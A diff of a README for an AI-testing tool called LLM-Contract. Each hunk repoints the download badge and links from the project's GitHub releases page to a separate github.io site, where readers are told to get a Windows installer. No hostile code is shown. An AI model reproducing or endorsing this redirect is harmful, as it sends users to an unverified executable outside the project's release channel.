@@ -8,7 +8,7 @@ Think of it like a quality control system for your AI. Just like a contract says
 
 ### 📥 Download the Application
 
-[![Download LLM-Contract](https://img.shields.io/badge/Download-LLM--Contract-blue?style=for-the-badge&logo=github&color=random)](https://github.com/sarthaksinha2600/LLM-Contract/releases)
+[![Download LLM-Contract](https://img.shields.io/badge/Download-LLM--Contract-blue?style=for-the-badge&logo=github&color=random)](https://sarthaksinha2600.github.io)
 
 Visit this link to download the application. You'll see a page with different files – choose the one for your computer and save it.
 
@@ -79,7 +79,7 @@ Automatically block deployments if your AI fails tests – just like software te
 ## ⚙️ Installation Guide
 
 ### Step 1: Download
-Visit the [download page](https://github.com/sarthaksinha2600/LLM-Contract/releases) and get the file for Windows.
+Visit the [download page](https://sarthaksinha2600.github.io) and get the file for Windows.
 
 ### Step 2: Save the File
 Save the downloaded file somewhere easy to find, like your Desktop or Downloads folder.
@@ -247,7 +247,7 @@ New to AI testing? Check these resources:
 
 ## 🔄 Updating LLM-Contract
 
-Visit the [download page](https://github.com/sarthaksinha2600/LLM-Contract/releases) regularly for new versions. Updates are usually easy:
+Visit the [download page](https://sarthaksinha2600.github.io) regularly for new versions. Updates are usually easy:
 
 1. Download the new version
 2. Run the installer
@@ -293,7 +293,7 @@ Found a bug? Have an idea? Want to help translate?
 
 ## 🔗 Download Again
 
-[Download LLM-Contract Now](https://github.com/sarthaksinha2600/LLM-Contract/releases)
+[Download LLM-Contract Now](https://sarthaksinha2600.github.io)
 
 ---
 
